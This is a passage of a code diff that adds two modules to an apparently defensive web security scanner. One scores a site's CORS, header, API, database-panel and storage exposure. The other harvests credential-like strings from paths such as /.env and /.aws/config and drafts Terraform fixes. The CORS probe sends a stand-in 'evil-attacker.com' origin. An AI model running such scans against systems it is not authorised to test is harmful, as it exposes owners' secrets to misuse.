+  1256→        elif status == 405:
+  1257→            add(f"API route exists — {path}", "low", "unauth_api",
+  1258→                f"API route exists (405 Method Not Allowed) — may be exploitable with correct method",
+  1259→                f"GET {path} → 405", 3)
+  1260→    audit_log("vibesec.api.done", detail=f"{len([f for f in findings if f['category'] == 'unauth_api'])} findings")
+  1261→
+  1262→    # ── Category 3: CORS Policy Analysis ────────────────────────────────────
+  1263→    audit_log("vibesec.cors.start", detail=host)
+  1264→    # Test with an origin probe
+  1265→    cors_resp = http_probe(base_url, timeout=5)
+  1266→    cors_headers = cors_resp.get("headers", {})
+  1267→    acao = cors_headers.get("Access-Control-Allow-Origin", "")
+  1268→    if acao == "*":
+  1269→        add("Permissive CORS — wildcard origin", "high", "cors",
+  1270→            "Access-Control-Allow-Origin: * — any domain can make cross-origin requests",
+  1271→            f"CORS header: {acao}", 12)
+  1272→    elif acao and acao != "null":
+  1273→        # Specific origin — check if it reflects the Origin header
+  1274→        reflect_resp = http_probe(base_url, headers={"Origin": "https://evil-attacker.com"}, timeout=5)
+  1275→        reflected = reflect_resp.get("headers", {}).get("Access-Control-Allow-Origin", "")
+  1276→        if "evil-attacker" in reflected:
+  1277→            add("CORS origin reflection vulnerability", "critical", "cors",
+  1278→                "Server reflects any Origin header back — allows cross-origin attacks from any domain",
+  1279→                f"Sent Origin: https://evil-attacker.com, got back: {reflected}", 15)
+  1280→    allow_cred = cors_headers.get("Access-Control-Allow-Credentials", "")
+  1281→    if acao != "" and allow_cred.lower() == "true":
+  1282→        add("CORS credentials exposed", "high", "cors",
+  1283→            "Access-Control-Allow-Credentials: true with non-empty Allow-Origin",
+  1284→            f"Allow-Credentials: true, Allow-Origin: {acao or '(reflected)'}", 10)
+  1285→    if not acao:
+  1286→        # No CORS header at all — check if it's a JSON API that should have CORS
+  1287→        ct = cors_headers.get("content-type", "")
+  1288→        if "json" in ct.lower():
+  1289→            add("JSON API without CORS headers", "low", "cors",
+  1290→                "API returns JSON but sets no CORS headers — may be intentional or oversight",
+  1291→            f"Content-Type: {ct}, no CORS headers", 3)
+  1292→    audit_log("vibesec.cors.done", detail=f"{len([f for f in findings if f['category'] == 'cors'])} findings")
+  1293→
+  1294→    # ── Category 4: Exposed Anon/Public Backend Keys ────────────────────────
+  1295→    audit_log("vibesec.anon_keys.start", detail=host)
+  1296→    # Check the main page body for exposed service URLs
+  1297→    main_body = http_probe(base_url, timeout=5).get("body", "")[:16384]
+  1298→    for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
+  1299→        matches = pattern.findall(main_body)
+  1300→        if matches:
+  1301→            unique = list(set(matches))[:5]
+  1302→            # Verify each match resolves (zero fabrication)
+  1303→            verified = []
+  1304→            for m in unique:
+  1305→                test_url = f"https://{m}" if not m.startswith("http") else m
+  1306→                probe = http_probe(test_url, timeout=3)
+  1307→                if probe.get("status", 0) > 0:
+  1308→                    verified.append(m)
+  1309→            if verified:
+  1310→                add(f"Exposed {name} backend — {len(verified)} instance(s)", "critical", "anon_keys",
+  1311→                    f"Public {name} URLs found in page source and confirmed reachable",
+  1312→                    f"{name}: {', '.join(verified[:3])}", 15)
+  1313→            else:
+  1314→                add(f"Detected {name} references — not verified", "medium", "anon_keys",
+  1315→                    f"{name} URLs found in page source but could not confirm reachability",
+  1316→                    f"{name}: {', '.join(unique[:3])}", 5)
+  1317→
+  1318→    # Also check robots.txt and sitemap for exposed service URLs
+  1319→    for check_path in ["/robots.txt", "/sitemap.xml"]:
+  1320→        check_resp = http_probe(base_url.rstrip("/") + check_path, timeout=5)
+  1321→        if check_resp.get("status") == 200:
+  1322→            check_body = check_resp.get("body", "")[:8192]
+  1323→            for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
+  1324→                matches = pattern.findall(check_body)
+  1325→                if matches and not any(f["title"].startswith(f"Exposed {name}") for f in findings):
+  1326→                    unique = list(set(matches))[:3]
+  1327→                    add(f"{name} URLs in {check_path}", "medium", "anon_keys",
+  1328→                        f"Public {name} URLs exposed in {check_path}",
+  1329→                        f"{check_path}: {', '.join(unique)}", 5)
+  1330→    audit_log("vibesec.anon_keys.done", detail=f"{len([f for f in findings if f['category'] == 'anon_keys'])} findings")
+  1331→
+  1332→    # ── Category 5: Missing Security Headers (HSTS/CSP/etc.) ─────────────
+  1333→    audit_log("vibesec.security_headers.start", detail=host)
+  1334→    root_resp = http_probe(base_url, timeout=5)
+  1335→    root_headers = root_resp.get("headers", {})
+  1336→    for header_name, display_name, severity, pts in VIBESEC_SECURITY_HEADERS:
+  1337→        if header_name.lower() not in {k.lower() for k in root_headers}:
+  1338→            add(f"Missing {display_name} header", severity, "security_headers",
+  1339→                f"{display_name} ({header_name}) is not set — leaves users vulnerable to specific attacks",
+  1340→                f"Header {header_name} absent from root response", pts)
+  1341→    audit_log("vibesec.security_headers.done", detail=f"{len([f for f in findings if f['category'] == 'security_headers'])} findings")
+  1342→
+  1343→    # ── Category 6: Exposed Database Admin Interfaces ─────────────────────
+  1344→    audit_log("vibesec.db_admin.start", detail=host)
+  1345→    for path in VIBESEC_DB_ADMIN_PATHS:
+  1346→        url = base_url.rstrip("/") + path
+  1347→        resp = http_probe(url, timeout=5)
+  1348→        status = resp.get("status", 0)
+  1349→        body = resp.get("body", "")[:2048]
+  1350→        if status == 200 and len(body) > 20:
+  1351→            # Verify it's actually a DB admin page, not a generic 200
+  1352→            db_signals = ["phpmyadmin", "adminer", "mongo", "redis", "pgadmin",
+  1353→                          "prisma", "graphql", "apollo", "database", "mysql", "postgres"]
+  1354→            body_lower = body.lower()
+  1355→            is_db = any(sig in body_lower for sig in db_signals)
+  1356→            is_protected = bool(VIBESEC_AUTH_PATTERN.search(body))
+  1357→            if is_db and not is_protected:
+  1358→                add(f"Exposed DB admin — {path}", "critical", "exposed_db",
+  1359→                    f"Database management interface accessible without auth: {path} (200 OK)",
+  1360→                    f"GET {path} -> 200 (DB admin panel, no auth)", 15)
+  1361→            elif is_db:
+  1362→                add(f"DB admin reachable — {path}", "high", "exposed_db",
+  1363→                    f"Database management interface exists at {path} (may require POST auth)",
+  1364→                    f"GET {path} -> 200 (DB signals detected)", 8)
+  1365→        elif status == 401 or status == 403:
+  1366→            pass  # properly protected
+  1367→    audit_log("vibesec.db_admin.done", detail=f"{len([f for f in findings if f['category'] == 'exposed_db'])} findings")
+  1368→
+  1369→    # ── Category 7: S3/R2/Cloud Storage Directory Listings ────────────────
+  1370→    audit_log("vibesec.storage_exposure.start", detail=host)
+  1371→    for path in VIBESEC_STORAGE_EXPOSURE_PATHS:
+  1372→        url = base_url.rstrip("/") + path
+  1373→        resp = http_probe(url, timeout=5)
+  1374→        status = resp.get("status", 0)
+  1375→        body = resp.get("body", "")[:4096]
+  1376→        if status == 200 and len(body) > 50:
+  1377→            # Check for S3 XML listing or Apache/nginx directory listing
+  1378→            is_listing = any(indicator in body for indicator in VIBESEC_S3_LISTING_INDICATORS)
+  1379→            is_html_listing = "Index of" in body or "<title>Index of" in body or "Directory listing" in body
+  1380→            if is_listing or is_html_listing:
+  1381→                add(f"Storage directory listing — {path}", "critical", "storage_exposure",
+  1382→                    f"Cloud storage/static directory listing enabled: {path} (200 OK, listing exposed)",
+  1383→                    f"GET {path} -> 200 (directory listing)", 15)
+  1384→            else:
+  1385→                add(f"Storage path accessible — {path}", "medium", "storage_exposure",
+  1386→                    f"Storage path returns 200 but no listing detected: {path}",
+  1387→                    f"GET {path} -> 200 ({len(body)}B)", 3)
+  1388→    # Also check S3/R2 URLs from anon key patterns for listing behavior
+  1389→    for name, pattern in VIBESEC_ANON_KEY_PATTERNS:
+  1390→        if name in ("aws-s3", "cloudflare-r2", "gcp-storage", "azure-blob"):
+  1391→            matches = pattern.findall(main_body)
+  1392→            for m in list(set(matches))[:3]:
+  1393→                test_url = f"https://{m}" if not m.startswith("http") else m
+  1394→                probe = http_probe(test_url, timeout=4)
+  1395→                pbody = probe.get("body", "")[:4096]
+  1396→                if probe.get("status") == 200 and any(ind in pbody for ind in VIBESEC_S3_LISTING_INDICATORS):
+  1397→                    add(f"{name} bucket listing — {m}", "critical", "storage_exposure",
+  1398→                        f"{name} bucket exposes directory listing: {m}",
+  1399→                        f"{m} -> 200 (bucket listing)", 15)
+  1400→    audit_log("vibesec.storage_exposure.done", detail=f"{len([f for f in findings if f['category'] == 'storage_exposure'])} findings")
+  1401→
+  1402→    # ── Score Calculation ──────────────────────────────────────────────────
+  1403→    raw_score = max(0, 100 - deductions)
+  1404→    # Normalize: if no findings at all, perfect score
+  1405→    if not findings:
+  1406→        raw_score = 100
+  1407→    # Clamp
+  1408→    raw_score = min(100, max(0, raw_score))
+  1409→    grade, grade_color = _vibesec_compute_grade(raw_score)
+  1410→    badge_md = _vibesec_render_badge(host, grade, raw_score)
+  1411→
+  1412→    severity_counts: Dict[str, int] = {}
+  1413→    for f in findings:
+  1414→        sev = f["severity"]
+  1415→        severity_counts[sev] = severity_counts.get(sev, 0) + 1
+  1416→
+  1417→    result = {
+  1418→        "module": "VIBESEC",
+  1419→        "vibesec_score": raw_score,
+  1420→        "grade": grade,
+  1421→        "grade_color": grade_color,
+  1422→        "badge_markdown": badge_md,
+  1423→        "total_findings": len(findings),
+  1424→        "severity_counts": severity_counts,
+  1425→        "findings": findings,
+  1426→        "categories_checked": ["exposed_config", "unauth_api", "cors", "anon_keys",
+  1427→                                 "security_headers", "exposed_db", "storage_exposure"],
+  1428→        "max_possible_score": 100,
+  1429→    }
+  1430→    audit_log("vibesec.complete", detail=f"score={raw_score} grade={grade} findings={len(findings)}")
+  1431→    return result
+  1432→
+  1433→
+  1434→def render_vibesec_panel(vibesec: Dict[str, Any]) -> None:
+  1435→    """Render VibeSec results as a Rich panel with grade, table, and badge."""
+  1436→    score = vibesec.get("vibesec_score", 0)
+  1437→    grade = vibesec.get("grade", "F")
+  1438→    grade_color = vibesec.get("grade_color", "bold bright_red")
+  1439→    total = vibesec.get("total_findings", 0)
+  1440→    sc = vibesec.get("severity_counts", {})
+  1441→
+  1442→    # Score bar
+  1443→    bar_width = 40
+  1444→    filled = int(score / 100 * bar_width)
+  1445→    bar = "█" * filled + "░" * (bar_width - filled)
+  1446→
+  1447→    console.print(Panel(
+  1448→        Group(
+  1449→            Text("\n  VIBESEC BENCHMARK — AI/Vibe-Coding Vulnerability Audit", style="bold bright_green"),
+  1450→            Text(f""),
+  1451→            Text(f"  Score: {bar} [bold {grade_color}]{score}/100 ({grade})[/{grade_color}]", style="white"),
+  1452→            Text(f""),
+  1453→            Text(f"  Findings: [bold]{total}[/]  "
+  1454→                 f"[bright_red]{sc.get('critical',0)} critical[/], "
+  1455→                 f"[red]{sc.get('high',0)} high[/], "
+  1456→                 f"[yellow]{sc.get('medium',0)} medium[/], "
+  1457→                 f"[green]{sc.get('low',0)} low[/], "
+  1458→                 f"[dim]{sc.get('info',0)} info[/]"),
+  1459→        ),
+  1460→        border_style="bright_green",
+  1461→        title="[bold]VIBESEC[/bold]",
+  1462→        title_align="left",
+  1463→        padding=(1, 2),
+  1464→    ))
+  1465→
+  1466→    # Findings table
+  1467→    findings = vibesec.get("findings", [])
+  1468→    if findings:
+  1469→        table = Table(title=f"Vibe Coding Vulnerabilities — {len(findings)} detected",
+  1470→                      border_style="bright_green", header_style="bold bright_green", show_lines=False)
+  1471→        table.add_column("Severity", style="bold", width=10)
+  1472→        table.add_column("Category", style="cyan", width=16)
+  1473→        table.add_column("Finding", style="white")
+  1474→        table.add_column("Pts", style="yellow", width=5)
+  1475→        sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
+  1476→        for f in findings[:20]:
+  1477→            sev = f["severity"]
+  1478→            table.add_row(
+  1479→                f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
+  1480→                f["category"], f["title"][:60], str(f.get("points_deducted", 0))
+  1481→            )
+  1482→        console.print(table)
+  1483→
+  1484→    # Badge snippet
+  1485→    badge = vibesec.get("badge_markdown", "")
+  1486→    if badge:
+  1487→        console.print()
+  1488→        console.print(Panel(
+  1489→            Group(
+  1490→                Text("  GitHub README Badge (copy-paste):", style="bold dim"),
+  1491→                Text(f"  {badge}", style="cyan"),
+  1492→            ),
+  1493→            border_style="dim",
+  1494→            title="[dim]Badge[/dim]",
+  1495→            title_align="left",
+  1496→            padding=(0, 2),
+  1497→        ))
+  1498→
+  1499→
+  1500→# ══════════════════════════════════════════════════════════════════════════════
+  1501→# MODULE 8: NHI GRAPH — Non-Human Identity & Blast-Radius Mapping
+  1502→# ══════════════════════════════════════════════════════════════════════════════
+  1503→
+  1504→def _nhi_verify_match(value: str, body: str) -> bool:
+  1505→    """Verify an identity match is real, not documentation/placeholder."""
+  1506→    if not value:
+  1507→        return False
+  1508→    placeholders = {"example", "your-", "xxx", "placeholder", "replace", "changeme", "todo", "insert"}
+  1509→    val_lower = value.lower()
+  1510→    for ph in placeholders:
+  1511→        if ph in val_lower:
+  1512→            return False
+  1513→    # Reject if surrounded by documentation markers
+  1514→    try:
+  1515→        if re.search(r'<!--.*?-->.*' + re.escape(value), body[:2000]):
+  1516→            return False
+  1517→        if re.search(r'["\'][\s]*' + re.escape(value) + r'[\s]*["\'].*#.*example', body[:2000], re.I):
+  1518→            return False
+  1519→    except Exception:
+  1520→        pass
+  1521→    # Reject if too short
+  1522→    if len(value) < 8:
+  1523→        return False
+  1524→    # Require at least 2 different character classes
+  1525→    classes = 0
+  1526→    if re.search(r'[a-z]', value):
+  1527→        classes += 1
+  1528→    if re.search(r'[A-Z]', value):
+  1529→        classes += 1
+  1530→    if re.search(r'[0-9]', value):
+  1531→        classes += 1
+  1532→    if re.search(r'[_\-.@/]', value):
+  1533→        classes += 1
+  1534→    return classes >= 2
+  1535→
+  1536→
+  1537→def _nhi_op_severity(op_name: str) -> str:
+  1538→    """Map over-permission pattern name to severity."""
+  1539→    severity_map = {
+  1540→        "wildcard_action": "critical",
+  1541→        "wildcard_resource": "critical",
+  1542→        "admin_wildcard": "critical",
+  1543→        "s3_full_bucket": "high",
+  1544→        "iam_passrole": "high",
+  1545→    }
+  1546→    return severity_map.get(op_name, "medium")
+  1547→
+  1548→
+  1549→def _nhi_compute_risk(identities: list, overpermissions: list, blast_radius: dict) -> int:
+  1550→    """Compute 0-100 risk score for NHI findings."""
+  1551→    score = 0
+  1552→    verified = [i for i in identities if i.get("verified")]
+  1553→    score += min(30, len(verified) * 8)
+  1554→    critical_ops = [o for o in overpermissions if o.get("severity") == "critical"]
+  1555→    high_ops = [o for o in overpermissions if o.get("severity") == "high"]
+  1556→    score += min(40, len(critical_ops) * 15 + len(high_ops) * 8)
+  1557→    score += min(30, blast_radius.get("max_depth", 0) * 5 + blast_radius.get("reachable_services", 0) * 5)
+  1558→    return min(100, score)
+  1559→
+  1560→
+  1561→def _nhi_generate_remediation(overpermissions: list, identities: list, host: str) -> str:
+  1562→    """Generate Terraform remediation patch for detected wildcards."""
+  1563→    if not overpermissions:
+  1564→        return ""
+  1565→    lines = ['# Terraform Remediation Patch — generated by ReconPro NHI Graph']
+  1566→    lines.append(f'# Target: {host}')
+  1567→    lines.append(f'# Generated: {datetime.utcnow().isoformat()}Z')
+  1568→    lines.append('')
+  1569→
+  1570→    for op in overpermissions:
+  1571→        pattern = op.get("pattern", "")
+  1572→        safe = _safe_filename(host)
+  1573→
+  1574→        if pattern == "wildcard_action":
+  1575→            lines.append('# ── Replace wildcard Action with least-privilege ──')
+  1576→            lines.append('resource "aws_iam_policy" "least_privilege" {')
+  1577→            lines.append(f'  name        = "least-privilege-{safe}"')
+  1578→            lines.append('  description = "Least-privilege policy replacing wildcard"')
+  1579→            lines.append('  policy = jsonencode({')
+  1580→            lines.append('    Version = "2012-10-17"')
+  1581→            lines.append('    Statement = [{')
+  1582→            lines.append('      Effect   = "Allow"')
+  1583→            lines.append('      Action   = ["s3:GetObject", "s3:ListBucket"]  # Replace with actual needed actions')
+  1584→            lines.append('      Resource = ["arn:aws:s3:::your-bucket/*"]')
+  1585→            lines.append('    }]')
+  1586→            lines.append('  })')
+  1587→            lines.append('}')
+  1588→            lines.append('')
+  1589→
+  1590→        elif pattern == "wildcard_resource":
+  1591→            lines.append('# ── Restrict wildcard Resource to specific ARNs ──')
+  1592→            lines.append('resource "aws_iam_policy" "restricted_resource" {')
+  1593→            lines.append(f'  name        = "restricted-resource-{safe}"')
+  1594→            lines.append('  policy = jsonencode({')
+  1595→            lines.append('    Version = "2012-10-17"')
+  1596→            lines.append('    Statement = [{')
+  1597→            lines.append('      Effect   = "Allow"')
+  1598→            lines.append('      Action   = "*"  # TODO: scope this action too')
+  1599→            lines.append('      Resource = ["arn:aws:s3:::your-specific-bucket/*"]  # Replace wildcard')
+  1600→            lines.append('    }]')
+  1601→            lines.append('  })')
+  1602→            lines.append('}')
+  1603→            lines.append('')
+  1604→
+  1605→        elif pattern == "admin_wildcard":
+  1606→            lines.append('# ── Remove AdministratorAccess — use scoped policy ──')
+  1607→            lines.append('# WARNING: AdministratorAccess grants full access to all AWS resources')
+  1608→            lines.append('resource "aws_iam_role_policy_attachment" "remove_admin" {')
+  1609→            lines.append('  role       = "your-role-name"')
+  1610→            lines.append('  # Detach: "arn:aws:iam::aws:policy/AdministratorAccess"')
+  1611→            lines.append('  policy_arn = aws_iam_policy.least_privilege.arn')
+  1612→            lines.append('}')
+  1613→            lines.append('')
+  1614→
+  1615→        elif pattern == "s3_full_bucket":
+  1616→            lines.append('# ── Scope S3 permissions to specific buckets ──')
+  1617→            lines.append('resource "aws_iam_policy" "s3_scoped" {')
+  1618→            lines.append(f'  name        = "s3-scoped-{safe}"')
+  1619→            lines.append('  policy = jsonencode({')
+  1620→            lines.append('    Version = "2012-10-17"')
+  1621→            lines.append('    Statement = [{')
+  1622→            lines.append('      Effect   = "Allow"')
+  1623→            lines.append('      Action   = ["s3:GetObject", "s3:PutObject", "s3:ListBucket"]')
+  1624→            lines.append('      Resource = [')
+  1625→            lines.append('        "arn:aws:s3:::your-bucket",')
+  1626→            lines.append('        "arn:aws:s3:::your-bucket/*"')
+  1627→            lines.append('      ]')
+  1628→            lines.append('    }]')
+  1629→            lines.append('  })')
+  1630→            lines.append('}')
+  1631→            lines.append('')
+  1632→
+  1633→        elif pattern == "iam_passrole":
+  1634→            lines.append('# ── Restrict iam:PassRole to specific roles ──')
+  1635→            lines.append('resource "aws_iam_policy" "passrole_restricted" {')
+  1636→            lines.append(f'  name        = "passrole-restricted-{safe}"')
+  1637→            lines.append('  policy = jsonencode({')
+  1638→            lines.append('    Version = "2012-10-17"')
+  1639→            lines.append('    Statement = [{')
+  1640→            lines.append('      Effect   = "Allow"')
+  1641→            lines.append('      Action   = "iam:PassRole"')
+  1642→            lines.append('      Resource = "arn:aws:iam::*:role/your-specific-role"')
+  1643→            lines.append('      Condition = {')
+  1644→            lines.append('        StringEquals = {')
+  1645→            lines.append('          "iam:PassedToService" = "ec2.amazonaws.com"')
+  1646→            lines.append('        }')
+  1647→            lines.append('      }')
+  1648→            lines.append('    }]')
+  1649→            lines.append('  })')
+  1650→            lines.append('}')
+  1651→            lines.append('')
+  1652→
+  1653→    verified = [i for i in identities if i.get("verified")]
+  1654→    if verified:
+  1655→        lines.append('# ── Rotate exposed credentials ──')
+  1656→        lines.append('# ACTION REQUIRED: Rotate the following exposed credentials immediately:')
+  1657→        for ident in verified[:10]:
+  1658→            lines.append(f'#   - {ident["type"]}: {ident["value"][:60]} (found in {ident["source"]})')
+  1659→        lines.append('')
+  1660→
+  1661→    return "\n".join(lines)
+  1662→
+  1663→
+  1664→def module_nhi_graph(host: str) -> Dict[str, Any]:
+  1665→    """Non-Human Identity & Blast-Radius Mapping.
+  1666→
+  1667→    Scans target for:
+  1668→      1. Cloud identity signals in page source, JS, metadata
+  1669→      2. Over-permissioned IAM/role patterns
+  1670→      3. Exposed service account credentials
+  1671→      4. Graph construction: nodes (Identity, Role, Endpoint, Database)
+  1672→         edges (HAS_ACCESS_TO, CAN_ASSUME, EXPOSES_TOKEN)
+  1673→      5. Blast-radius: traverse from any vulnerability to connected resources
+  1674→      6. Generate Terraform remediation patch for detected wildcards
+  1675→    """
+  1676→    audit_log("nhi_graph.start", detail=f"target={host}")
+  1677→
+  1678→    # Paths to probe for identity signals
+  1679→    probe_paths = [
+  1680→        "/",
+  1681→        "/.well-known/",
+  1682→        "/robots.txt",
+  1683→        "/sitemap.xml",
+  1684→        "/api/",
+  1685→        "/config.json",
+  1686→        "/.env",
+  1687→        "/package.json",
+  1688→        "/firebase.json",
+  1689→        "/.aws/config",
+  1690→        "/.github/workflows/",
+  1691→    ]
+  1692→
+  1693→    base = host if host.startswith("http") else f"https://{host}"
+  1694→    if not base.endswith("/"):
+  1695→        base += "/"
+  1696→
+  1697→    identities_found = []
+  1698→    all_bodies = []  # (path, body_text, resp_dict) pairs for context analysis
+  1699→
+  1700→    # Phase 1: Fetch and scan for identity patterns
+  1701→    for path in probe_paths:
+  1702→        url = base + path.lstrip("/")
+  1703→        try:
+  1704→            resp = http_probe(url)
+  1705→        except Exception as e:
+  1706→            audit_log("nhi_graph.probe.error", status=type(e).__name__, detail=f"url={url} err={str(e)[:120]}")
+  1707→            continue
+  1708→        body = resp.get("body", "")
+  1709→        if body:
+  1710→            all_bodies.append((path, body, resp))
+  1711→
+  1712→        for pat_name, pat_re in NHI_IDENTITY_PATTERNS:
+  1713→            matches = pat_re.findall(body)
+  1714→            seen = set()
+  1715→            for match in matches:
+  1716→                val = match if isinstance(match, str) else (match[0] if match and isinstance(match, tuple) else "")
+  1717→                if not val or val in seen:
+  1718→                    continue
+  1719→                seen.add(val)
+  1720→
+  1721→                verified = _nhi_verify_match(val, body)
+  1722→
+  1723→                identities_found.append({
+  1724→                    "type": pat_name,
+  1725→                    "value": val,
+  1726→                    "source": path,
+  1727→                    "verified": verified,
+  1728→                })
+  1729→
+  1730→    audit_log("nhi_graph.scan", detail=f"identities_raw={len(identities_found)}")
+  1731→
+  1732→    # Phase 2: Build identity graph
+  1733→    nodes = []
+  1734→    edges = []
+  1735→    node_id_map = {}  # label -> node_id
+  1736→    node_counter = [0]
+  1737→
+  1738→    def _add_node(label: str, ntype: str) -> str:
+  1739→        if label in node_id_map:
+  1740→            return node_id_map[label]
+  1741→        nid = f"nhi_{node_counter[0]}"
+  1742→        node_counter[0] += 1
+  1743→        node_id_map[label] = nid
+  1744→        nodes.append({"id": nid, "type": ntype, "label": label})
+  1745→        return nid
+  1746→
+  1747→    def _add_edge(src_id: str, tgt_id: str, relation: str):
+  1748→        if src_id and tgt_id and src_id != tgt_id:
+  1749→            edges.append({"source": src_id, "target": tgt_id, "relation": relation})
+  1750→
+  1751→    # Target endpoint node
+  1752→    target_node = _add_node(host, "Endpoint")
+  1753→
+  1754→    # Identity nodes
+  1755→    for ident in identities_found:
+  1756→        id_node = _add_node(ident["value"], "Identity")
+  1757→        _add_edge(target_node, id_node, "EXPOSES_TOKEN")
+  1758→
+  1759→    # Phase 3: Check for over-permission patterns in response bodies
+  1760→    overpermissions = []
+  1761→    for path, body, resp in all_bodies:
+  1762→        for op_name, op_re in NHI_OVERPERMISSION_PATTERNS:
+  1763→            op_matches = op_re.findall(body)
+  1764→            seen_op = set()
+  1765→            for op_val in op_matches:
+  1766→                val = op_val if isinstance(op_val, str) else (op_val[0] if op_val and isinstance(op_val, tuple) else "")
+  1767→                if not val or val in seen_op:
+  1768→                    continue
+  1769→                seen_op.add(val)
+  1770→
+  1771→                linked = [i for i in identities_found if i["source"] == path]
+  1772→                linked_strs = [f'{i["type"]}:{i["value"][:30]}' for i in linked[:3]]
+  1773→
+  1774→                severity = _nhi_op_severity(op_name)
+  1775→                overpermissions.append({
+  1776→                    "identity": linked_strs[0] if linked_strs else "unknown",
+  1777→                    "pattern": op_name,
+  1778→                    "severity": severity,
+  1779→                    "description": f"Found '{val}' in {path}",
+  1780→                    "value": val,
+  1781→                })
+  1782→
+  1783→                op_node = _add_node(f"OVERPERM:{op_name}", "Role")
+  1784→                _add_edge(target_node, op_node, "HAS_ACCESS_TO")
+  1785→
+  1786→    audit_log("nhi_graph.overpermissions", detail=f"count={len(overpermissions)}")
+  1787→
+  1788→    # Phase 4: Compute blast radius via BFS
+  1789→    adj = {}  # adjacency list (undirected)
+  1790→    for node in nodes:
+  1791→        adj[node["id"]] = set()
+  1792→    for edge in edges:
+  1793→        if edge["source"] in adj:
+  1794→            adj[edge["source"]].add(edge["target"])
+  1795→        if edge["target"] in adj:
+  1796→            adj[edge["target"]].add(edge["source"])
+  1797→
+  1798→    max_depth = 0
+  1799→    reachable_types = {"Database": set(), "Secret": set(), "Service": set()}
+  1800→
+  1801→    for ident in identities_found:
+  1802→        if ident["value"] not in node_id_map:
+  1803→            continue
+  1804→        start = node_id_map[ident["value"]]
+  1805→        visited = {start}
+  1806→        queue = [(start, 0)]
+  1807→        while queue:
+  1808→            current, depth = queue.pop(0)
+  1809→            if depth > max_depth:
+  1810→                max_depth = depth
+  1811→            for neighbor in adj.get(current, set()):
+  1812→                if neighbor not in visited:
+  1813→                    visited.add(neighbor)
+  1814→                    queue.append((neighbor, depth + 1))
+  1815→            for node in nodes:
+  1816→                if node["id"] == current:
+  1817→                    ntype = node["type"]
+  1818→                    if ntype == "Database":
+  1819→                        reachable_types["Database"].add(current)
+  1820→                    elif ntype == "Identity":
+  1821→                        reachable_types["Secret"].add(current)
+  1822→                    elif ntype in ("Role", "Service"):
+  1823→                        reachable_types["Service"].add(current)
+  1824→
+  1825→    blast_radius = {
+  1826→        "max_depth": max_depth,
+  1827→        "reachable_databases": len(reachable_types["Database"]),
+  1828→        "reachable_secrets": len(reachable_types["Secret"]),
+  1829→        "reachable_services": len(reachable_types["Service"]),
+  1830→    }
+  1831→
+  1832→    # Phase 5: Generate Terraform remediation
+  1833→    remediation_tf = _nhi_generate_remediation(overpermissions, identities_found, host)
+  1834→
+  1835→    # Phase 6: Compute risk score
+  1836→    risk_score = _nhi_compute_risk(identities_found, overpermissions, blast_radius)
+  1837→
+  1838→    result = {
+  1839→        "module": "NHI GRAPH",
+  1840→        "identities_found": identities_found,
+  1841→        "nodes": nodes,
+  1842→        "edges": edges,
+  1843→        "overpermissions": overpermissions,
+  1844→        "blast_radius": blast_radius,
+  1845→        "remediation_tf": remediation_tf,
+  1846→        "total_identities": len(identities_found),
+  1847→        "risk_score": risk_score,
+  1848→    }
+  1849→
+  1850→    audit_log("nhi_graph.complete", detail=f"risk={risk_score} identities={len(identities_found)} ops={len(overpermissions)}")
+  1851→    return result
+  1852→
+  1853→
+  1854→def render_nhi_graph_panel(nhi: Dict[str, Any]) -> None:
+  1855→    """Render NHI Graph results with identity tree, overpermissions table, and remediation."""
+  1856→    score = nhi.get("risk_score", 0)
+  1857→    total = nhi.get("total_identities", 0)
+  1858→    blast = nhi.get("blast_radius", {})
+  1859→    op_count = len(nhi.get("overpermissions", []))
+  1860→
+  1861→    # Score bar
+  1862→    bar_width = 40
+  1863→    filled = int(score / 100 * bar_width)
+  1864→    bar = "█" * filled + "░" * (bar_width - filled)
+  1865→
+  1866→    if score >= 70:
+  1867→        sc_color = "bright_red"
+  1868→    elif score >= 40:
+  1869→        sc_color = "yellow"
+  1870→    else:
+  1871→        sc_color = "green"
+  1872→
+  1873→    console.print(Panel(
+  1874→        Group(
+  1875→            Text("\n  NHI GRAPH — Non-Human Identity & Blast-Radius Mapping", style="bold cyan"),
+  1876→            Text(""),
+  1877→            Text(f"  Risk Score: {bar} [bold {sc_color}]{score}/100[/{sc_color}]", style="white"),
+  1878→            Text(""),
+  1879→            Text(f"  Identities Found: [bold]{total}[/]  |  "
+  1880→                 f"Over-permissions: [bold]{op_count}[/]  |  "
+  1881→                 f"Blast Depth: [bold]{blast.get('max_depth', 0)}[/]"),
+  1882→            Text(f"  Reachable: [red]{blast.get('reachable_databases', 0)} DBs[/], "
+  1883→                 f"[yellow]{blast.get('reachable_secrets', 0)} secrets[/], "
+  1884→                 f"[magenta]{blast.get('reachable_services', 0)} services[/]"),
+  1885→        ),
+  1886→        border_style="cyan",
+  1887→        title="[bold]NHI GRAPH[/bold]",
+  1888→        title_align="left",
+  1889→        padding=(1, 2),
+  1890→    ))
+  1891→
+  1892→    # Identity graph tree
+  1893→    nodes = nhi.get("nodes", [])
+  1894→    edges = nhi.get("edges", [])
+  1895→    if nodes:
+  1896→        adj = {}
+  1897→        for node in nodes:
+  1898→            adj[node["id"]] = []
+  1899→        for edge in edges:
+  1900→            if edge["source"] in adj:
+  1901→                adj[edge["source"]].append(edge)
+  1902→
+  1903→        tree = Tree("🌐 [bold]Identity Graph[/]", guide_style="cyan")
+  1904→
+  1905→        root_nodes = [n for n in nodes if n["type"] == "Endpoint"]
+  1906→        if root_nodes:
+  1907→            root = root_nodes[0]
+  1908→            root_branch = tree.add(f"[bold]{root['label']}[/]")
+  1909→
+  1910→            type_colors = {
+  1911→                "Identity": "yellow",
+  1912→                "Role": "red",
+  1913→                "Endpoint": "cyan",
+  1914→                "Database": "green",
+  1915→                "Service": "magenta",
+  1916→            }
+  1917→
+  1918→            for edge in adj.get(root["id"], []):
+  1919→                target_node = next((n for n in nodes if n["id"] == edge["target"]), None)
+  1920→                if target_node:
+  1921→                    tcolor = type_colors.get(target_node["type"], "white")
+  1922→                    label = target_node["label"]
+  1923→                    if len(label) > 50:
+  1924→                        label = label[:47] + "..."
+  1925→                    branch = root_branch.add(
+  1926→                        f"[{tcolor}]{label}[/{tcolor}] [dim]({target_node['type']} • {edge['relation']})[/]"
+  1927→                    )
+  1928→
+  1929→                    for child_edge in adj.get(target_node["id"], []):
+  1930→                        child_node = next((n for n in nodes if n["id"] == child_edge["target"]), None)
+  1931→                        if child_node:
